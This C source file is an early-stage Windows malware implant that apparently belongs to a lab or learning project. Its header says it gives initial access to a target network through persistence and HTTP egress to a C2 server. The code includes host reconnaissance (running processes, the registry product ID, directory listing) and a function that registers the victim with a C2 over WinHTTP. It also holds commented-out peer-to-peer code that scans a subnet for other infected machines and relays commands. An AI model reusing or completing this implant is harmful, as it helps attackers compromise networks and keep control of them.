/**************************************
 * This exe provides initial access
 * to a target network by establishing
 * persistence and http egress with the
 * linked C2 server
 * ***********************************/

// TODO
// Read environment variables
// List network interfaces
// Get Windows Version
// Retrieve username + token
// Retrieve computer name
// Retrieve machine GUID
// List files in directory
// Change directory
// List running processes

#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <dirent.h>
#include <zmq.h>

// Print all running processes
void RunningProcesses(){
    HANDLE hSnap;
    PROCESSENTRY32 ProcessStruct;
    ProcessStruct.dwSize = sizeof(PROCESSENTRY32);
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    if(Process32First(hSnap, &ProcessStruct) == FALSE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    do{
        printf("%s\n", ProcessStruct.szExeFile);
    }while(Process32Next(hSnap, &ProcessStruct));
    CloseHandle(hSnap);
}

// Identify system using product ID
void ProductID(){
    char value[30];
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)&value, &size);
	printf("value: %s\n", value);
}

// List files in directory
void ls(char* path){
    // Open context
    DIR *d;
    d = opendir(path);

    struct dirent *de;
    if (d != NULL){
        while ( de = readdir(d)){
            printf("%s\n", de->d_name);
        }
        closedir(d);
    }
}

void RegisterC2(_TCHAR* gid){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/register",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                wchar_t* headers = L"Content-Type: application/json\r\n";
                char* jsonData = (char*) malloc(128);
                sprintf(jsonData, "{ \"gid\": %s }", gid);
                size_t size = strlen(jsonData) * sizeof(char);

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers,
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

int _tmain(int argc, _TCHAR *argv[]){
    /*
    if(argc == 2){
        // Report intrusion to C2
        _TCHAR* gid = malloc(64);
        sprintf(gid, "239");
        RegisterC2(gid);
    }
    */

    // Do malware things (investigation, looting, persistence)

    // Situational Awareness tasks
    //RunningProcesses();
    //ls(".");
    //ProductID();

    /*

    // Establish peer network
    // Create a router for recieving messages
    void* context = zmq_ctx_new();
    void* router = zmq_socket(context, ZMQ_ROUTER);
    int success = zmq_bind(router, "tcp://*:8889");
    if (success != 0){

    }

    // Scan network for other infected machines
    // Brute force method
    void* dealer = zmq_socket(context, ZMQ_DEALER);
    for(int address = 1; address < 255; address++){
        zmq_connect(dealer, "tcp://192.168.56.%d:8889", address);
    }


    // Timed loop for checking potential peers and retrieving commands from c2
    while(1){
        // Read router activity
        _TCHAR* buffer = malloc(64*sizeof(char));
        zmq_recv(router, buffer, 64, 0);
        printf("Incoming message: %s", buffer);
        Sleep(10000);
        zmq_send(dealer, buffer, 64, 0);
    }

    */
}